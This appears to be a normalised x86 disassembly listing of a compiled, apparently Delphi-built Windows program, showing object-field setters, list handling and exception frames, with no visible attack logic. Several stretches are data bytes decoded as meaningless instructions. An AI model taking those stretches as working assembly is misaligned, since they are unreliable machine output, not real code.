mov eax [ r-xdata ]
call sub_4626c4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp ebx 0x3e8
jl r-xdata
cmp ebx 0x64
jl r-xdata
add [ ebx + 0x56 ] dl
mov esi edx
xor eax eax
push ebp
push sub_479747
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov edx esi
mov eax [ r-xdata ]
call sub_462668
mov ebx eax
inc esi
inc ebx
inc ebp
jb r-xdata
inc eax
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
mov edx [ sub_479568 ]
call sub_4040f0
test al al
je r-xdata
jns r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
jl r-xdata
outsd
jb r-xdata
mov edx esi
mov eax ebx
call sub_4752e0
pop esi
pop ebx
retn
mov eax ebx
call sub_475574
mov edx eax
mov eax esi
call sub_4754b4
mov eax [ esi + 0x18 ]
mov edx [ ebx + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
inc esi
add ah al
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc esi
inc ebx
add [ eax ] al
adc [ esi + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004796 ] cl
add [ eax ] al
add [ eax - 0x53ffb8ae ] al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47974e
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
jo r-xdata
or cl [ ecx + 0x64 ]
push edx
sub_4796e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor eax eax
push ebp
push sub_479747
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov edx esi
mov eax [ r-xdata ]
call sub_462668
mov ebx eax
cmp ebx 0x64
jl r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ r-xdata ]
call sub_4626c4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp ebx 0x3e8
jl r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47974e
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_479758
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_479898
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_475574
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ r-xdata ]
call sub_4625b0
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47989f
lea eax [ ebp - 0x1c ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
sub eax 0x1
jno r-xdata
test eax eax
jl r-xdata
call sub_403e34
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
cmp esi eax
jge r-xdata
call sub_403e34
push [ ebp - 0x4 ]
push r-xdata
lea ecx [ ebp - 0x1c ]
mov edx esi
mov eax [ ebx + 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_4051e4
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push [ ebp - 0x4 ]
push r-xdata
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
sub eax 0x1
jno r-xdata
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_4798bb
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
mov ebx edx
xor eax eax
push ebp
push sub_479928
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_405120
cmp eax 0x4
jl r-xdata
mov al 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx 0x1
mov edx 0x4
mov eax ebx
call sub_405384
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405270
je r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47992f
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_47993b
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_479999
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_475574
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_479ac4
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4799a0
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4799a4
push ebx
mov ebx eax
mov eax ebx
call sub_475574
test eax eax
jg r-xdata
mov al 0x1
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
xor eax eax
pop ebx
retn
sub_4799c8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_479ab6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479abd
lea eax [ ebp - 0x1c ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx 0x3
mov edx 0x1
call sub_405384
mov edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_4626c4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_475584
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx 0x1
jno r-xdata
test ebx ebx
jl r-xdata
call sub_403e34
inc ebx
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x5
call sub_405384
mov edx [ ebp - 0x18 ]
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
sub_479ac4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_4631dc
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_479c70
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x479d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx * 4 + 0x47 ] dl
add al dh
add [ eax ] al
add [ ebx + ebx * 4 ] cl
inc edi
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add ah bl
test [ edi ] sub_416eac
in al dx
fld [ ecx ]
enter 0x416d 0x0
in al 0xf8
inc edi
add [ esp + edi * 8 - 0x67bffb9 ] cl
inc edi
add [ eax ] ch
stc
inc edi
add [ eax + 0x40047f9 ] dl
mov [ 0xffffffffa4440047 ] al
inc edi
add [ edx - 0x5d37ffb9 ] bl
inc edi
add al ch
mov [ 0xffffffff9f100047 ] al
inc edi
add [ ecx + 0x540c0047 ] ch
dec ecx
push esp
inc ebx
push eax
inc ebx
insb
imul esp [ ebp + 0x6e ] r-xdata
push 0x700479d
or al 0x54
dec ecx
push esp
inc ebx
push eax
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x479cb874
add [ esp + ebx * 4 ] bh
inc edi
add [ edx ] dl
add [ ebx ] cl
dec ecx
push esp
inc ebx
push eax
inc ebx
insb
imul esp [ ebp + 0x6e ] 0xb0000a74
adc [ eax ] al
test al 0x0
add bh bh
push esp
mov [ 0x10047 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
pop es
inc edx
outsd
jne r-xdata
add [ eax + 0x50 ] dh
inc esi
add al bh
sahf
inc edi
add [ edi + eax * 2 ] cl
inc edi
add [ edi + eax * 2 + 0x48140047 ] bl
inc edi
add ah al
clc
inc edi
add [ edi + esi * 8 - 0x5c8fffb9 ] dh
inc edi
add ah ch
std
inc edi
add ah dl
cli
inc edi
add [ eax - 0x5 ] cl
inc edi
add ah ch
cld
inc edi
add [ edi + esi * 8 - 0x7c3ffb9 ] bh
inc edi
add al ch
std
inc edi
add [ eax - 0x1bffb805 ] ch
clc
je r-xdata
dec ecx
push eax
cmp al 0x10
inc eax
add [ eax + eax - 0x5d7b0100 ] ch
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
or [ edx + 0x6f ] eax
jne r-xdata
add [ eax ] al
or [ 0x6e4f0b00 ] 0x43
cmp [ esi ] al
les eax [ eax ]
add bh bh
nop
add [ eax ] al
inc [ ecx ]
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
cmp al 0x10
inc eax
add ah dl
add [ eax ] al
dec [ eax + eax + 0x1fe00 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ eax + edx * 2 ] al
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xff
push eax
outsd
jb r-xdata
mov ebx eax
mov eax ebx
call sub_47fd6c
mov [ ebx + 0xd8 ] 0xffffffff
pop ebx
retn
cmp al 0x10
inc eax
add [ esp + 0x47 ] dl
add [ edx ] bh
inc edi
add [ eax ] al
inc [ eax ]
mov [ 0x10047 ] eax
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x6e4f0b00
inc ebx
cmp al 0x10
inc eax
add [ eax + 0x24ff0000 ] bh
mov [ 0x10047 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
push cs
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x69 ] si
insd
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or al 0x4f
outsb
inc edx
outsw
jb r-xdata
add bh bh
add [ ebx + 0x10047 ] ah
jo r-xdata
inc edx
imul ebp [ esi + 0x64 ] r-xdata
call 0x39469edb
mov [ 0x10047 ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or ecx [ edi + 0x6e ]
outsd
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5004000e ] al
mov al 0x10
inc eax
add al al
add [ eax ] al
dec [ eax + 0x1fe0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000b ] al
outsd
jae r-xdata
inc ecx
je r-xdata
add [ eax ] al
add [ eax + 0x4f0b0011 ] al
outsb
dec edx
add al ch
cwde
sar al 0x1
dec [ ebx - 0x74af07bb ]
inc ebp
cld
cmp [ eax + 0xc0 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_46328c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd4 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_46328c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x520b000f ] al
popad
push esp
imul ebp [ ebp + 0x65 ] 0x6c74756f
cmp eax [ ecx ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4909000c ] al
push eax
push esi
jb r-xdata
cmp [ eax ] bh
inc esi
add ah al
add [ eax ] al
call [ eax + 0x1fe0000 ]
xor edx edx
push ebp
push sub_47a14e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xbc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x84 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x34 ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x94 ] 0x1
mov edx [ eax ]
call [ edx + 0x5c ]
mov edx eax
mov eax [ r-xdata ]
pop ecx
call sub_46328c
mov eax [ ebp - 0x4 ]
call sub_406fd4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
imul ebp [ esi + 0x64 ] 0x8bd88b53
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xd4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xb8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov [ eax + 0x8c ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xd8 ]
mov [ eax + 0xb8 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0xa0 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xbc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov eax [ eax + 0x9c ]
test eax eax
je r-xdata
lea eax [ ebx + 0xd4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
call sub_404e98
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xac ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
mov [ eax + 0xd8 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xb4 ]
mov [ eax + 0xe0 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xb0 ]
mov [ eax + 0xdc ] edx
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xc4 ]
mov [ eax + 0x105 ] dl
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xe8 ] ecx
mov ecx [ edx + 0xe4 ]
mov [ eax + 0xec ] ecx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xe8 ]
mov [ eax + 0xf0 ] ecx
mov ecx [ edx + 0xec ]
mov [ eax + 0xf4 ] ecx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea ecx [ ebp - 0x10 ]
mov dl 0x2
mov eax [ ebp - 0x4 ]
call sub_474648
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a1a2
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
sub_479f10
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47a19b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
mov edx eax
mov eax [ r-xdata ]
pop ecx
call sub_46328c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc0 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_46328c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd4 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_46328c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_47a14e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xbc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x84 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x34 ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x94 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xd4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xb8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov [ eax + 0x8c ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xd8 ]
mov [ eax + 0xb8 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0xa0 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xbc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov eax [ eax + 0x9c ]
test eax eax
je r-xdata
lea eax [ ebx + 0xd4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
call sub_404e98
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xac ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
mov [ eax + 0xd8 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xb4 ]
mov [ eax + 0xe0 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xb0 ]
mov [ eax + 0xdc ] edx
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xc4 ]
mov [ eax + 0x105 ] dl
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xe8 ] ecx
mov ecx [ edx + 0xe4 ]
mov [ eax + 0xec ] ecx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xe8 ]
mov [ eax + 0xf0 ] ecx
mov ecx [ edx + 0xec ]
mov [ eax + 0xf4 ] ecx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea ecx [ ebp - 0x10 ]
mov dl 0x2
mov eax [ ebp - 0x4 ]
call sub_474648
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a1a2
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
sub_47a153
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
test eax eax
je r-xdata
call sub_404800
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a1a2
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov edx [ eax ]
call [ edx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_47a1ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
xor eax eax
push ebp
push sub_47a1f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x98 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a1ff
mov eax [ ebp - 0x4 ]
call sub_47fde0
retn
sub_47a254
push ebx
push esi
push edi
mov esi edx
mov ebx eax
lea eax [ ebx + 0xa8 ]
mov edx esi
call sub_404e98
mov edi [ ebx + 0xa0 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0xd4 ]
mov edx esi
call sub_404e98
sub_47a29c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
lea eax [ ebx + 0xc0 ]
mov edx esi
call sub_404e98
mov edi [ ebx + 0x8c ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_47a2c8
push esi
push edi
mov esi eax
mov [ esi + 0xd4 ] edx
mov edi [ esi + 0x8c ]
test edi edi
je r-xdata
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x50 ]
sub_47a300
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0xe0 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0xe4 ] edx
mov edx [ eax + 0xa0 ]
test edx edx
je r-xdata
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ edx + 0xe8 ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0xec ] eax
sub_47a338
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0xe8 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0xec ] edx
mov edx [ eax + 0xa0 ]
test edx edx
je r-xdata
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ edx + 0xf0 ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0xf4 ] eax
sub_47a370
push ebx
push esi
mov esi eax
mov eax esi
call sub_47fa44
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
mov ebx [ esi + 0xa0 ]
test ebx ebx
je r-xdata
mov edx [ esi + 0xd4 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov edx [ esi + 0xc0 ]
mov eax [ esi + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ esi + 0x8c ]
mov edx [ esi + 0xb8 ]
mov [ eax + 0x8c ] edx
mov edx [ esi + 0xd8 ]
mov [ eax + 0xb8 ] edx
pop esi
pop ebx
retn
lea eax [ ebx + 0xd4 ]
mov edx [ esi + 0xa8 ]
call sub_404e98
mov eax [ esi + 0xa0 ]
mov edx [ esi + 0xac ]
mov [ eax + 0xd8 ] edx
mov edx [ esi + 0xb4 ]
mov [ eax + 0xe0 ] edx
mov edx [ esi + 0xb0 ]
mov [ eax + 0xdc ] edx
movzx edx [ esi + 0xc4 ]
mov [ eax + 0x105 ] dl
mov edx [ esi + 0xe0 ]
mov [ eax + 0xe8 ] edx
mov edx [ esi + 0xe4 ]
mov [ eax + 0xec ] edx
mov edx [ esi + 0xe8 ]
mov [ eax + 0xf0 ] edx
mov edx [ esi + 0xec ]
mov [ eax + 0xf4 ] edx
sub_47a4cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_47a575
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax edi
call sub_405120
mov ebx eax
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a57c
lea eax [ ebp - 0xc ]
call sub_404e44
retn
mov esi 0x1
add eax [ esp ]
adc edx [ esp + 0x4 ]
jno r-xdata
call sub_403e34
add esp 0x8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
inc esi
dec ebx
jne r-xdata
call sub_403e34
lea eax [ ebp - 0xc ]
push eax
mov ecx 0x1
mov edx esi
mov eax edi
call sub_405384
mov edx [ ebp - 0xc ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_462668
cdq
push edx
push eax
push 0x0
push 0x8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_405f78
jno r-xdata
sub_47a58c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov [ esi + 0x18 ] 0x0
xor eax eax
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_47a5cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
mov eax edi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
movzx eax [ esi + 0x18 ]
sub al 0x1
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx edi
call sub_464840
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0x10
mov eax edi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor ebx ebx
jmp r-xdata
movzx edx [ esi + ebx * 2 + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
imul ecx ebx 0x2
jno r-xdata
call sub_403e2c
mov edx edi
call sub_463a38
inc ebx
cmp ebx 0x8
jne r-xdata
call sub_403e34
cmp ebx 0x7
jbe r-xdata
sub_47a660
push ebp
mov ebp esp
sub edx 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
